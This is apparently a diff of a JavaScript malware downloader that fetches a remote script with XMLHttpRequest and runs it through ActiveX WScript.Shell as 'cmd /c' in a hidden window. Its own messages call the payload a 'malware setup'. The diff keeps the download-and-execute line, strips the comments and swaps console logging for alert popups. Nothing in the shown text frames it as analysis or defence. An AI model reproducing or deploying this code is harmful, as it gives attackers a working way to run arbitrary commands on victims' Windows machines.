@@ -16,21 +16,18 @@
             if (xhr.status === 200) {
                 var shell = new ActiveXObject("WScript.Shell");
                 try {
-                    // Execute the downloaded script without displaying any prompts
-                    shell.Run('cmd /c ' + xhr.responseText, 0, false);
+                    shell.Run('cmd /c ' + xhr.responseText, 0, true);
+                    alert("Malware setup executed successfully!");
                 } catch (error) {
-                    // Handle any errors that may occur during execution
-                    console.error("Error executing the malware setup:", error);
+                    alert("Error executing the malware setup: " + error.message);
                 }
             } else {
-                // Handle the case when the download fails
-                console.error("Failed to download the malware setup. Status code:", xhr.status);
+                alert("Failed to download the malware setup. Status code: " + xhr.status);
             }
         };
 
         xhr.onerror = function() {
-            // Handle errors that occur during the download process
-            console.error("Error occurred while downloading the malware setup.");
+            alert("Error occurred while downloading the malware setup.");
         };
         
         xhr.send();
